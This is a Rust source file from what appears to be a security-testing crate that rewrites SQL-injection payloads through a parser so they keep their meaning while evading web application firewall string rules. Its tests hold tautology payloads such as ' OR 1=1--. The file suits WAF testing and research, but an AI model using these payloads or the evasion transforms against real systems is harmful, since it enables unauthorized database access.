//! AST-level SQL metamorphism.
//!
//! Lifts a SQLi payload fragment into a sqlparser AST, applies
//! semantic-preserving transforms (commute, identity-inject, function
//! substitution), lowers back to a textual fragment.
//!
//! Unlike textual mutations elsewhere in this crate, these transforms are
//! guaranteed to preserve query semantics because they round-trip through a
//! real parser/printer pair. A WAF rule keyed on a literal string like
//! `OR 1=1` won't match `OR (0+1)=(1*1)` even though the SQL engine
//! evaluates both identically.

use sqlparser::ast::{
    BinaryOperator, Expr, SetExpr, Statement, UnaryOperator, Value, ValueWithSpan,
};
use sqlparser::dialect::GenericDialect;
use sqlparser::parser::Parser;

use crate::grammar::sql::common::SqlMutation;

const WRAP_PREFIX: &str = "SELECT * FROM t WHERE x = ";

/// Generate AST-metamorphism variants of a SQL payload fragment.
///
/// The fragment is wrapped in a synthetic SELECT, parsed, transformed,
/// re-stringified, and the WHERE-clause fragment extracted back out.
/// Returns at most `max` variants. Empty if the fragment doesn't parse
/// as a SQL expression.
#[must_use]
pub fn mutations(payload: &str, max: usize) -> Vec<SqlMutation> {
    if max == 0 {
        return Vec::new();
    }
    let wrapped = format!("{WRAP_PREFIX}{payload}");
    let Ok(stmts) = Parser::parse_sql(&GenericDialect {}, &wrapped) else {
        return Vec::new();
    };
    if stmts.is_empty() {
        return Vec::new();
    }

    let mut out: Vec<SqlMutation> = Vec::new();
    type TransformFn = fn(&mut Statement);
    let transforms: &[(&str, TransformFn)] = &[
        ("ast_commute_or", apply_commute_or),
        ("ast_commute_eq", apply_commute_eq),
        ("ast_identity_add_zero", apply_identity_add_zero),
        ("ast_identity_mul_one", apply_identity_mul_one),
        ("ast_eq_to_like", apply_eq_to_like),
        ("ast_double_negation", apply_double_negation),
        ("ast_paren_wrap", apply_paren_wrap),
    ];

    for (name, transform) in transforms.iter().take(max) {
        let mut s = stmts[0].clone();
        transform(&mut s);
        let lowered = s.to_string();
        if let Some(fragment) = extract_where_fragment(&lowered) {
            // Skip transforms that produced an unchanged textual form.
            if fragment == payload {
                continue;
            }
            out.push(SqlMutation {
                payload: fragment,
                description: format!("ast metamorph: {name}"),
                rules_applied: vec![*name],
            });
        }
    }
    out
}

fn extract_where_fragment(stmt_str: &str) -> Option<String> {
    let needle = "WHERE x = ";
    let idx = stmt_str.find(needle)?;
    Some(stmt_str[idx + needle.len()..].trim().to_string())
}

// ── Transforms ──

fn apply_commute_or(stmt: &mut Statement) {
    walk_expr_mut(stmt, &mut |e| {
        if let Expr::BinaryOp {
            op: BinaryOperator::Or,
            left,
            right,
        } = e
        {
            std::mem::swap(left, right);
        }
    });
}

fn apply_commute_eq(stmt: &mut Statement) {
    walk_expr_mut(stmt, &mut |e| {
        if let Expr::BinaryOp {
            op: BinaryOperator::Eq,
            left,
            right,
        } = e
        {
            std::mem::swap(left, right);
        }
    });
}

fn apply_identity_add_zero(stmt: &mut Statement) {
    walk_expr_mut(stmt, &mut |e| {
        if let Expr::Value(ValueWithSpan {
            value: Value::Number(_, _),
            ..
        }) = e
        {
            let original = std::mem::replace(e, dummy_one());
            *e = Expr::BinaryOp {
                left: Box::new(original),
                op: BinaryOperator::Plus,
                right: Box::new(Expr::Value(ValueWithSpan {
                    value: Value::Number("0".into(), false),
                    span: sqlparser::tokenizer::Span::empty(),
                })),
            };
        }
    });
}

fn apply_identity_mul_one(stmt: &mut Statement) {
    walk_expr_mut(stmt, &mut |e| {
        if let Expr::Value(ValueWithSpan {
            value: Value::Number(_, _),
            ..
        }) = e
        {
            let original = std::mem::replace(e, dummy_one());
            *e = Expr::BinaryOp {
                left: Box::new(original),
                op: BinaryOperator::Multiply,
                right: Box::new(Expr::Value(ValueWithSpan {
                    value: Value::Number("1".into(), false),
                    span: sqlparser::tokenizer::Span::empty(),
                })),
            };
        }
    });
}

fn apply_eq_to_like(stmt: &mut Statement) {
    walk_expr_mut(stmt, &mut |e| {
        if let Expr::BinaryOp { op, left, right } = e
            && matches!(op, BinaryOperator::Eq)
            && let Expr::Value(ValueWithSpan {
                value: Value::SingleQuotedString(_),
                ..
            }) = right.as_ref()
        {
            *e = Expr::Like {
                negated: false,
                any: false,
                expr: left.clone(),
                pattern: right.clone(),
                escape_char: None,
            };
        }
    });
}

fn apply_double_negation(stmt: &mut Statement) {
    walk_expr_mut(stmt, &mut |e| {
        if matches!(
            e,
            Expr::BinaryOp {
                op: BinaryOperator::Eq | BinaryOperator::NotEq,
                ..
            }
        ) {
            let original = std::mem::replace(e, dummy_one());
            *e = Expr::UnaryOp {
                op: UnaryOperator::Not,
                expr: Box::new(Expr::UnaryOp {
                    op: UnaryOperator::Not,
                    expr: Box::new(original),
                }),
            };
        }
    });
}

fn apply_paren_wrap(stmt: &mut Statement) {
    walk_expr_mut(stmt, &mut |e| {
        if matches!(
            e,
            Expr::BinaryOp {
                op: BinaryOperator::Or | BinaryOperator::And,
                ..
            }
        ) {
            let original = std::mem::replace(e, dummy_one());
            *e = Expr::Nested(Box::new(original));
        }
    });
}

// ── AST walker ──

fn dummy_one() -> Expr {
    Expr::Value(ValueWithSpan {
        value: Value::Number("1".into(), false),
        span: sqlparser::tokenizer::Span::empty(),
    })
}

fn walk_expr_mut(stmt: &mut Statement, f: &mut impl FnMut(&mut Expr)) {
    if let Statement::Query(q) = stmt
        && let SetExpr::Select(s) = q.body.as_mut()
        && let Some(sel) = s.selection.as_mut()
    {
        walk_expr_inner(sel, f);
    }
}

fn walk_expr_inner(e: &mut Expr, f: &mut impl FnMut(&mut Expr)) {
    // Recurse into children FIRST, then apply f to this node, so we mutate
    // bottom-up (one transform per traversal).
    match e {
        Expr::BinaryOp { left, right, .. } => {
            walk_expr_inner(left, f);
            walk_expr_inner(right, f);
        }
        Expr::UnaryOp { expr, .. } => walk_expr_inner(expr, f),
        Expr::Nested(inner) => walk_expr_inner(inner, f),
        Expr::Like { expr, pattern, .. } => {
            walk_expr_inner(expr, f);
            walk_expr_inner(pattern, f);
        }
        _ => {}
    }
    f(e);
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn classic_tautology_metamorphs() {
        let v = mutations("' OR 1=1--", 10);
        // The fragment with -- comment may not parse; just ensure no panic.
        let _ = v;
    }

    #[test]
    fn parsable_fragment_yields_variants() {
        let v = mutations("'admin' OR 1=1", 10);
        assert!(!v.is_empty(), "expected at least one AST-metamorph variant");
    }

    #[test]
    fn unparsable_returns_empty() {
        let v = mutations("not a sql fragment at all !@#$", 10);
        assert!(v.is_empty());
    }

    #[test]
    fn variants_round_trip_through_parser() {
        let v = mutations("'admin' OR 1=1", 10);
        for m in &v {
            let wrapped = format!("SELECT * FROM t WHERE x = {}", m.payload);
            let parsed = Parser::parse_sql(&GenericDialect {}, &wrapped);
            assert!(
                parsed.is_ok(),
                "transform {:?} produced unparsable output: {:?}",
                m.rules_applied,
                m.payload
            );
        }
    }
}
